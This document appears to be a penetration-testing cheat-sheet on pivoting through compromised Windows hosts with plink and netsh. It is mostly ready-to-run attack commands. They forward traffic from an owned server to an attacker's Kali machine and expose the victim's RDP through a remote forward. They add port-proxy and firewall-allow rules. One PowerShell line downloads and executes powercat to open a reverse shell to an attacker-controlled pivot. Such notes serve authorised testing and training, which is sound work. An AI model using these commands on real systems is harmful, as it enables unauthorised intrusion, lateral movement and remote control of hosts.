# Port Forwarding with Windows Tools

SSH utilities can be found in `%systemdrive%\Windows\System32\OpenSSH`.
ssh.exe behaves as you'd expect.


## Plink

As we won't always have an openSSH client on windows hosts, it can be good to get an understanding of some alternatives.
PuTTY for the CLI.
It has similar features to openSSH, but without remote dynamic port forwarding.

If you are getting an error about algorithm choice when calling plink, consider getting a newer version from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).

*KEEP IN MIND*
Using plink will show your pw in the terminal.
If you are logging your terminal with tmux or anything like that, you will have your password in plaintext after running these commands!
For that reason alone, I personally prefer to use chisel as that tool is capable of covering all the scenarios I have yet to encounter.


### Local Port Forwarding

In the scenario where you have gained access to `SRV1` and you want to forward traffic from `SRV1` port 8000 to port 80 on your kali machine, you can do:

```
cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -L 0.0.0.0:8000:${ATTACKER_IP}:80 ${ATTACKER_IP} 
```

This way, if you later pivot to `SRV2` who cannot directly access your web server on your kali machine, you can call `${SRV1_IP}:${SRV1_PORT}` (port 8000 in this example),
to transfer files to `SRV2`.


If you want to combine the HTTP server with the capability to catch a reverse shell, you can do:

```
cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -L 0.0.0.0:${SRV1_SHELL_PORT}:${ATTACKER_IP}:${ATTACKER_SHELL_PORT} ${ATTACKER_IP} 
```

Now, trigger a powercat reverse shell from `SRV2`:

```
IEX(New-Object System.Net.WebClient).DownloadString('http://${SRV1_IP}:${SRV1_HTTP_PORT}/powercat.ps1');powercat -c ${SRV1_IP} -p ${SRV1_SHELL_PORT} -e powershell
```

### Remote Port Forwarding

assuming we have `plink.exe` available on the windows host, we can do remote port forwarding with:

```
cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_IP} 
```


(note the pipe command which answers `y` to the question about keys. The second time you do it, leave out the piping).
This can also be used to expose RDP:

```
cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:127.0.0.1:3389 ${ATTACKER_IP} 
```

Now, you can do the following from `${ATTACKER_IP}`:

```
xfreerdp /u:${DOMAIN}\\${user} /p:${password} /cert:ignore /v:127.0.0.1:${LISTENING_PORT}
```
## Netsh

Native way of port forwarding from windows (requires admin permissions):
```
netsh interface portproxy add v4tov4 listenport=${OWNED_PORT0} listenaddress=${OWNED_IP0} connectport=${OWNED_PORT1} connectaddress=${OWNED_IP1}
```
If you ever need to add firewall rules to allow traffic to flow through a given port on Windows (also requires admin permissions):
```
netsh advfirewall firewall add rule name="port_forward_ssh_${OWNED_PORT0}" protocol=TCP dir=in localip=${OWNED_IP0} localport=${OWNED_PORT0} action=allow
```
